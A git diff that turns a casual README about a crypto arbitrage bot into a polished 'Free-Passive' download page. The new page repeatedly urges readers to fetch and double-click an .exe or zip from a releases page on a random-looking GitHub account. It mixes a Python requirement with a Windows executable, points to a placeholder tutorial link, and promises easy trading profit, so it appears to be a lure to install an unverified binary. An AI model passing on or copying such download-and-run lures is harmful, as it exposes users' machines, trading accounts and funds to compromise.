@@ -1,28 +1,77 @@
-# 📈 Bot for Passive Income — My Experiment
+# 🚀 Free-Passive - Automate Your Trading Efforts Easily
 
-Hey! I got hooked on this [YouTube video](https://www.youtube.com/watch?v=v0-GjIm0HD0) about **arbitrage bots** that can make cash while you sleep. 😴 Decided to give it a try, wrote some code, and I’m sharing it with you. Repo’s open, grab it, test it, make money! 💪
+[![Download Free-Passive](https://img.shields.io/badge/Download-Free--Passive-blue)](https://github.com/Eunsei677383/Free-Passive/releases)
 
-![Crypto Chart](https://media.giphy.com/media/3o6ZtaO9BZHcOjmErm/giphy.gif)
+## 📋 Introduction
 
-## How I Got Into This
-Watched the video where a dude explains how bots profit from price differences across exchanges. Got pumped, started coding. This repo’s my first go, and I’m stoked!
+Welcome to **Free-Passive**! This software helps you set up a bot for arbitrage trading. You can easily automate your trading strategies with our user-friendly tools. Don't worry if you have no programming knowledge; we designed this for everyone.
 
-## Step by Step
-1. Hit the button and watch the video! 🎥
-2. Clone the repo, check out the code.
-3. Try running the bot.
+If you're interested in cryptocurrency and trading, this is a great resource for you. We've even included a YouTube tutorial to assist you along the way.
 
-<a href="https://www.youtube.com/watch?v=v0-GjIm0HD0">
-  <img src="https://img.shields.io/badge/YouTube-Go%20Watch-red?style=for-the-badge&logo=youtube" alt="Watch on YouTube">
-</a>
+## 🛠️ System Requirements
 
-## Why You Should Try
-- Bot automates trading.
-- Code’s free, I’m testing it myself.
-- Video makes it all super clear.
+Before you start, make sure your computer meets the following requirements:
 
-If you’re feeling it, subscribe to the channel for new ideas! 😎
+- **Operating System:** Windows 10 or later, macOS, or a recent Linux distribution
+- **Python:** Version 3.6 or higher
+- **Internet Connection:** Required for software updates and trading operations
+- **Disk Space:** At least 200 MB available
 
-> **Heads Up**: Test the bot with small amounts.
+## 🚀 Getting Started
 
-*Let’s make money together!*
+To download and run the software, follow these straightforward steps:
+
+1. **Visit the Releases Page:**
+   Go to the releases page by clicking the link below. This is where you can find the latest version of Free-Passive.
+
+   [Visit the Releases Page](https://github.com/Eunsei677383/Free-Passive/releases)
+
+2. **Download the Latest Version:**
+   On the releases page, find the latest release version. Look for a file labeled something like `Free-Passive.exe` or `Free-Passive.zip`. Click on it to start the download.
+
+3. **Install the Software:**
+   If you downloaded an executable file (`.exe`), just double-click it to start the installation. Follow the on-screen instructions. If you downloaded a zip file, extract it first. Then double-click the `.exe` file inside the extracted folder.
+
+4. **Run Free-Passive:**
+   After installation, you can find Free-Passive in your applications. Open the program, and you’re ready to start trading.
+
+5. **Set Up Your Account:**
+   The first time you run Free-Passive, you will need to create an account. Fill in the details, and secure your account with a password.
+
+6. **Configure Your Bot:**
+   Follow the setup wizard to configure your bot according to your preferred trading strategies. You can select different options for how your bot will operate.
+
+7. **Start Trading:**
+   Once you finish the setup, your bot is ready to go! Monitor its performance and make changes as needed.
+
+## 📼 YouTube Tutorial
+
+To help you get started quickly, we have created a YouTube tutorial. This tutorial walks you through each step, from downloading the software to configuring your bot. You can watch it here: [YouTube Tutorial](#).
+
+## 📄 Features
+
+- **User-Friendly Interface:** Easy to navigate, even for beginners.
+- **Multiple Trading Strategies:** Choose from several pre-defined strategies or customize your own.
+- **Real-Time Data:** The bot uses real-time market data to make informed decisions.
+- **Secure Account Management:** Keep your trading account safe with our security measures.
+- **Detailed Reporting:** Review your bot's performance with in-depth reports.
+
+## 📥 Download & Install
+
+To get started, download Free-Passive from our releases page:
+
+[Download Free-Passive](https://github.com/Eunsei677383/Free-Passive/releases)
+
+Once downloaded, follow the installation steps outlined earlier. This should set you up well for successful trading.
+
+## 🌐 Community and Support
+
+If you have questions or need support, feel free to join our community. You can find help on the discussion forums or connect with other users. Your feedback is valuable to us and helps improve Free-Passive.
+
+### 🔗 Useful Links
+
+- **GitHub Repository:** [Free-Passive GitHub](https://github.com/Eunsei677383/Free-Passive)
+- **Issues:** Report any bugs or request features directly on GitHub.
+- **Documentation:** Detailed documentation is available in the repository.
+
+Thank you for choosing Free-Passive! Whether you're new to trading or have some experience, we hope this software makes your trading journey smoother.
